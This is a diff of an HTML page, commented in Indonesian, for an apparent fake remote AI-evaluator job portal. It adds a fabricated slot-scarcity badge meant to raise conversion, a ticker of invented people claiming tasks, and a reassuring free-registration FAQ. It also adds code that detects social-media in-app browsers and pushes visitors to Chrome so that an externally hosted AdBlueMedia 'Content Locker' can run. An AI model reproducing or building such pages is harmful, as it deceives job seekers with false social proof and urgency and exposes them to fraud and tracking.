@@ -64,7 +64,8 @@
 
     <main class="flex-grow flex items-center justify-center px-4 py-8">
 
-        <div id="view-landing" class="w-full max-w-4xl text-center space-y-8 animate-fadeIn">
+        <!-- VIEW LANDING -->
+        <div id="view-landing" class="w-full max-w-4xl text-center space-y-8">
             <div class="inline-flex items-center space-x-2 bg-cyan-950/60 border border-cyan-800/50 px-4 py-1.5 rounded-full text-cyan-300 text-xs font-semibold">
                 <i class="fa-solid fa-shield-halved"></i>
                 <span>Official Q3 2026 AI Training Cohort Open</span>
@@ -79,12 +80,22 @@
             </p>
 
             <div class="flex flex-col sm:flex-row justify-center items-center space-y-3 sm:space-y-0 sm:space-x-4 pt-4">
-                <button onclick="switchView('view-onboarding')" class="w-full sm:w-auto bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-darkbg font-bold px-8 py-4 rounded-xl glow-btn transition-all transform hover:-translate-y-0.5">
+                <!-- Tombol Berkelanjutan Menggunakan Alur Pengecekan Soft Warning -->
+                <button onclick="handleInitialAction()" class="w-full sm:w-auto bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-darkbg font-bold px-8 py-4 rounded-xl glow-btn transition-all transform hover:-translate-y-0.5 cursor-pointer">
                     Apply as Remote Evaluator <i class="fa-solid fa-arrow-right ml-2"></i>
                 </button>
             </div>
 
-            <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 pt-8 max-w-3xl mx-auto border-t border-slate-800/80 text-left">
+            <!-- Badge Urgensi Slot Terbatas (Meningkatkan Konversi) -->
+            <div class="max-w-md mx-auto p-3 bg-amber-500/10 border border-amber-500/30 rounded-xl flex items-center justify-between text-xs text-amber-300">
+                <div class="flex items-center gap-2">
+                    <span class="animate-pulse">🔥</span>
+                    <span>Kuota Sesi Regional Hari Ini:</span>
+                </div>
+                <span class="font-bold bg-amber-500 text-slate-950 px-2 py-0.5 rounded-md">3 Slot Tersisa</span>
+            </div>
+
+            <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 pt-4 max-w-3xl mx-auto border-t border-slate-800/80 text-left">
                 <div class="bg-cardbg/50 border border-slate-800/60 p-4 rounded-xl">
                     <div class="text-slate-400 text-xs">Active Task Pool</div>
                     <div class="text-xl font-bold text-cyan-400 mt-1">1,429 Batches</div>
@@ -98,8 +109,30 @@
                     <div class="text-xl font-bold text-purple-400 mt-1">Daily / Instant</div>
                 </div>
             </div>
+
+            <!-- FAQ Section Ringkas -->
+            <div class="mt-8 pt-6 border-t border-slate-800 text-left max-w-3xl mx-auto">
+                <h4 class="text-xs font-bold text-slate-400 mb-3 uppercase tracking-wider">Frequently Asked Questions</h4>
+                <div class="space-y-3 text-xs">
+                    <details class="group bg-cardbg/50 p-3 rounded-lg border border-slate-800">
+                        <summary class="font-medium text-slate-200 cursor-pointer list-none flex justify-between items-center">
+                            <span>Apakah proses pendaftaran ini gratis?</span>
+                            <span class="group-open:rotate-180 transition-transform">▼</span>
+                        </summary>
+                        <p class="mt-2 text-slate-400 leading-relaxed">Ya, seluruh proses validasi dan alokasi tugas sepenuhnya gratis tanpa dipungut biaya.</p>
+                    </details>
+                    <details class="group bg-cardbg/50 p-3 rounded-lg border border-slate-800">
+                        <summary class="font-medium text-slate-200 cursor-pointer list-none flex justify-between items-center">
+                            <span>Berapa lama proses verifikasi tugas?</span>
+                            <span class="group-open:rotate-180 transition-transform">▼</span>
+                        </summary>
+                        <p class="mt-2 text-slate-400 leading-relaxed">Verifikasi berjalan otomatis setelah Anda menyelesaikan langkah pengamanan sistem yang diminta.</p>
+                    </details>
+                </div>
+            </div>
         </div>
 
+        <!-- VIEW ONBOARDING -->
         <div id="view-onboarding" class="w-full max-w-xl bg-cardbg border border-slate-800 p-6 sm:p-8 rounded-2xl shadow-2xl hidden space-y-6">
             <div>
                 <span class="text-xs font-semibold text-cyan-400 uppercase tracking-wider">Step 1 of 2</span>
@@ -137,11 +170,12 @@
                 </div>
             </div>
 
-            <button onclick="startVerificationProcess()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-darkbg font-bold py-3.5 rounded-xl glow-btn transition-all">
+            <button onclick="startVerificationProcess()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-darkbg font-bold py-3.5 rounded-xl glow-btn transition-all cursor-pointer">
                 Submit Profile & Initialize <i class="fa-solid fa-arrow-right ml-2"></i>
             </button>
         </div>
 
+        <!-- VIEW LOADING -->
         <div id="view-loading" class="w-full max-w-md bg-cardbg border border-slate-800 p-8 rounded-2xl shadow-2xl hidden text-center space-y-6">
             <div class="relative w-20 h-20 mx-auto">
                 <div class="absolute inset-0 rounded-full border-4 border-slate-800"></div>
@@ -161,6 +195,7 @@
             </div>
         </div>
 
+        <!-- VIEW DASHBOARD -->
         <div id="view-dashboard" class="w-full max-w-3xl space-y-6 hidden">
             <div class="bg-cardbg border border-slate-800 p-6 rounded-2xl flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
                 <div>
@@ -213,6 +248,54 @@
 
     </main>
 
+    <!-- MODAL 1: Peringatan Lembut (Bisa Ditutup / Soft Warning) -->
+    <div id="soft-warning-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm">
+        <div class="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-full p-6 text-center shadow-2xl">
+            <div class="text-amber-400 text-4xl mb-3">⚠️</div>
+            <h3 class="text-xl font-bold text-white mb-2">Browser Optimization Notice</h3>
+            <p class="text-sm text-slate-300 leading-relaxed mb-6">
+                We detected you are opening this link inside a social media app browser. For stable task dispatch and performance, we strongly recommend opening via <b class="text-cyan-400">Google Chrome or Safari</b>. You may continue here, but advanced security scripts may require an external browser later.
+            </p>
+            <div class="flex gap-3">
+                <button onclick="dismissSoftWarning()" class="flex-1 py-2.5 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-sm font-medium rounded-xl transition cursor-pointer">
+                    Stay Here
+                </button>
+                <button onclick="copyAndOpenChrome()" class="flex-1 py-2.5 px-4 bg-cyan-500 hover:bg-cyan-400 text-slate-950 text-sm font-bold rounded-xl transition shadow-lg shadow-cyan-500/20 cursor-pointer">
+                    Open in Chrome
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL 2: Hard Block (Wajib untuk Content Locker) -->
+    <div id="hard-block-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/90 p-4 backdrop-blur-md">
+        <div class="bg-slate-900 border border-red-500/50 rounded-2xl max-w-md w-full p-6 text-center shadow-2xl shadow-red-500/10">
+            <div class="text-red-500 text-4xl mb-3">🛑</div>
+            <h3 class="text-xl font-bold text-white mb-2">Browser Verification Required</h3>
+            <p class="text-sm text-slate-300 leading-relaxed mb-6">
+                The task security verification (*Content Locker*) strictly requires an external web browser (<b class="text-cyan-400">Chrome/Safari</b>). Social media in-app browsers block required background tracking scripts.
+                <br><br>Please copy the link and open it in Chrome to complete your task dispatch.
+            </p>
+            <button onclick="copyAndOpenChrome()" class="w-full py-3 px-4 bg-red-600 hover:bg-red-500 text-white text-sm font-bold rounded-xl transition shadow-lg shadow-red-600/20 mb-3 cursor-pointer">
+                Copy Link & Open in Chrome
+            </button>
+            <button onclick="closeHardBlock()" class="text-xs text-slate-400 hover:text-white underline cursor-pointer">
+                Close notice
+            </button>
+        </div>
+    </div>
+
+    <!-- Live Activity Ticker (Pojok Kiri Bawah) -->
+    <div id="activity-ticker" class="fixed bottom-4 left-4 z-40 max-w-xs bg-slate-900/90 border border-slate-700/80 backdrop-blur-md rounded-xl p-3 shadow-xl transition-all duration-500 transform translate-y-20 opacity-0">
+        <div class="flex items-center gap-3">
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-ping"></div>
+            <div>
+                <p id="ticker-text" class="text-xs text-slate-200 font-medium">Alex from New York completed Task #402</p>
+                <span class="text-[10px] text-slate-400">Just now • Verified Region</span>
+            </div>
+        </div>
+    </div>
+
     <footer class="border-t border-slate-800 py-6 text-center text-xs text-slate-500 space-y-2">
         <div class="flex justify-center space-x-6">
             <a href="#" class="hover:text-slate-300">Privacy Policy</a>
@@ -223,12 +306,57 @@
         <p>&copy; 2026 Global Remote Task Portal. All rights reserved. Operating under international remote labor compliance standards.</p>
     </footer>
 
+    <!-- AdBlueMedia Locker Script -->
     <script type="text/javascript"> 
         var NyOSN_kJy_qPXsbc = {"it":4631647,"key":"d9479"}; 
     </script> 
     <script src="https://d1chbu4sfo2xhu.cloudfront.net/b10f06d.js"></script>
 
     <script>
+        // Deteksi In-App Browser secara komprehensif
+        function isInAppBrowser() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            return (ua.indexOf('FBAN') > -1) || 
+                   (ua.indexOf('FBAV') > -1) || 
+                   (ua.indexOf('Instagram') > -1) || 
+                   (ua.indexOf('Twitter') > -1) || 
+                   (ua.indexOf('LinkedIn') > -1) ||
+                   (ua.indexOf('Line/') > -1) ||
+                   (ua.indexOf('Telegram') > -1) ||
+                   (/iPhone|iPod|iPad/.test(ua) && !/Safari/.test(ua)) ||
+                   (/\bwv\b/.test(ua));
+        }
+
+        let softWarningShown = false;
+
+        // Tahap 1: Saat tombol utama ditekan
+        function handleInitialAction() {
+            if (isInAppBrowser() && !softWarningShown) {
+                softWarningShown = true;
+                document.getElementById('soft-warning-modal').classList.remove('hidden');
+                return;
+            }
+            switchView('view-onboarding');
+        }
+
+        function dismissSoftWarning() {
+            document.getElementById('soft-warning-modal').classList.add('hidden');
+            switchView('view-onboarding');
+        }
+
+        function copyAndOpenChrome() {
+            const url = window.location.href;
+            navigator.clipboard.writeText(url).then(() => {
+                alert("Link copied successfully! Please paste it into your Google Chrome browser address bar.");
+            }).catch(() => {
+                prompt("Copy this link and open in Chrome:", url);
+            });
+        }
+
+        function closeHardBlock() {
+            document.getElementById('hard-block-modal').classList.add('hidden');
+        }
+
         function switchView(viewId) {
             document.getElementById('view-landing').classList.add('hidden');
             document.getElementById('view-onboarding').classList.add('hidden');
@@ -265,17 +393,53 @@
             }, 4200);
         }
 
+        // Tahap 2: Hard Block pada Content Locker
         function triggerContentLocker() {
+            if (isInAppBrowser()) {
+                document.getElementById('hard-block-modal').classList.remove('hidden');
+                return;
+            }
+
             if (typeof _xY === 'function') {
                 _xY();
             } else {
                 setTimeout(function() {
-                    if (typeof _xY === 'function') { _xY(); }
+                    if (typeof _xY === 'function') { 
+                        _xY(); 
+                    } else {
+                        alert("Locker script initializing... please click again in a moment.");
+                    }
                 }, 500);
             }
         }
+
+        // Live Activity Ticker Script
+        const activities = [
+            { name: "Michael V.", location: "California", task: "AI Prompt Review" },
+            { name: "Sarah K.", location: "Texas", task: "Data Annotation" },
+            { name: "David R.", location: "Florida", task: "AI Prompt Review" },
+            { name: "Jessica M.", location: "New York", task: "Data Annotation" }
+        ];
+
+        function showTicker() {
+            const ticker = document.getElementById('activity-ticker');
+            const textEl = document.getElementById('ticker-text');
+            
+            const randomAct = activities[Math.floor(Math.random() * activities.length)];
+            textEl.innerText = `${randomAct.name} (${randomAct.location}) claimed ${randomAct.task}`;
+            
+            ticker.classList.remove('translate-y-20', 'opacity-0');
+            
+            setTimeout(() => {
+                ticker.classList.add('translate-y-20', 'opacity-0');
+            }, 4000);
+        }
+
+        setInterval(showTicker, 14000);
+        setTimeout(showTicker, 3000);
     </script>
 
+    <!-- Histats Tracking -->
     <script type="text/javascript">
         var _Hasync= _Hasync|| [];
         _Hasync.push(['Histats.start', '1,5051899,4,0,0,0,00010000']);
